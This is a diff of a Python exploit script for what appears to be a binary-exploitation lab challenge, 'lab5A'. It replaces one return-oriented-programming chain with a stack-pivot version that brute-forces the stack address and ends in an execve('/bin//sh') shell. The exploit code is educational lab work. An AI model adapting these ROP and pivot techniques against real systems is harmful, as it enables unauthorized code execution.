@@ -1,47 +1,91 @@
-from struct import pack
+import struct
+import sys
 
-ADD_EAX_2 = pack('<I', 0x080980a7)
-ADD_EAX_3 = pack('<I', 0x080980c0)
-XOR_EAX_EAX = pack('<I', 0x08054c30)
-INT_80 = pack('<I', 0x08048eaa)
-POP_EDX = pack('<I', 0x0806f3aa)
-POP_EAX = pack('<I', 0x080bc4d6)
-POP_EBX = pack('<I', 0x080481c9)
-POP_ECX = pack('<I', 0x080e6255)
-MOV_EDX_EAX = pack('<I', 0x080a2ccd)
+# (python /tmp/lab5a.py 3221223085; cat) | ./lab5A
 
-# Padding goes here
-p = ''
 
-p += POP_EDX
-p += pack('<I', 0x080eb060) # @ .data
-p += POP_EAX
-p += '/bin'
-p += MOV_EDX_EAX
+# problem is building ROP
+# stack pivot? argv/envp is wiped...
 
-p += POP_EDX
-p += pack('<I', 0x080eb064) # @ .data + 4
-p += POP_EAX
-p += '//sh'
-p += MOV_EDX_EAX
+# the stack is 'fragmented', so we need to pivot
 
-p += pack('<I', 0x0806f3aa) # pop edx ; ret
-p += pack('<I', 0x080eb068) # @ .data + 8
-p += XOR_EAX_EAX
-p += MOV_EDX_EAX # mov dword ptr [edx], eax ; ret
+# 1. set esp to cmd
+# 2. call __isoc99_scanf to get more controllable stack space!
+# 3. build 2d rop chain to exec shell
 
-p += POP_EBX # pop ebx ; ret
-p += pack('<I', 0x080eb060) # @ .data
-p += POP_ECX # pop ecx ; ret
-p += pack('<I', 0x080eb068) # @ .data + 8
-p += POP_EDX # pop edx ; ret
-p += pack('<I', 0x080eb068) # @ .data + 8
 
-p += XOR_EAX_EAX
-p += ADD_EAX_3
-p += ADD_EAX_3
-p += ADD_EAX_3
-p += ADD_EAX_2
-p += INT_80
+def sendline(line):
+    print "%s" % line
 
-print p
+
+# for bruteforcing
+stack_addr = int(sys.argv[1])
+
+# gadgets
+pop_edx = 0x0806f3aa
+pop_esp = 0x080bc486
+inc_eax = 0x080bc485
+pop_edx_ecx_ebx = 0x0806f3d0
+
+sendline('store')
+sendline('%d' % inc_eax)
+sendline('1')
+
+sendline('store')
+sendline('%d' % stack_addr)
+sendline('-4')
+
+
+sendline('store')
+sendline('%d' % pop_esp) # Sciagniecie adresu ze stosu wrzuconego powyzej
+sendline('-5')
+
+
+sendline('store')
+sendline('%d' % pop_edx)
+sendline('-7')
+
+template = 0x80bfa58  # " Failed to do %s command\n"
+scanf_call = 0x08048e8e
+
+payload = [
+    'store',
+    struct.pack('<I', scanf_call),
+    # Umieszczenie dodatkowych danych na stosie pozniej do zdjecia celem pivotu
+    struct.pack('<I', template),
+    struct.pack('<I', (stack_addr + 0x2f))
+]
+
+sendline(''.join(payload))
+
+
+sendline('%d' % pop_edx_ecx_ebx)
+sendline('-11')
+
+# gadgets
+xor_eax_ecx = struct.pack('<I', 0x08049c73)
+pop_ebx = struct.pack('<I', 0x0806f3a9)
+zero = struct.pack('<I', 0x00000000)
+ebx_addr = struct.pack('<I', stack_addr + 0x7f)
+pop_eax = struct.pack('<I', 0x080bc4d5)
+inc_eax = struct.pack('<I', 0x0807be16)
+int_80 = struct.pack('<I', 0x08048eaa)
+
+
+format_string = " Failed to do %s command\n"
+
+rop_chain = [
+    xor_eax_ecx,
+    zero * 4,
+    pop_ebx,
+    ebx_addr,
+    zero,
+    inc_eax * 11,
+    int_80,
+    '/bin//sh',
+    zero
+]
+
+payload = format_string % ''.join(rop_chain)
+
+sendline(payload)
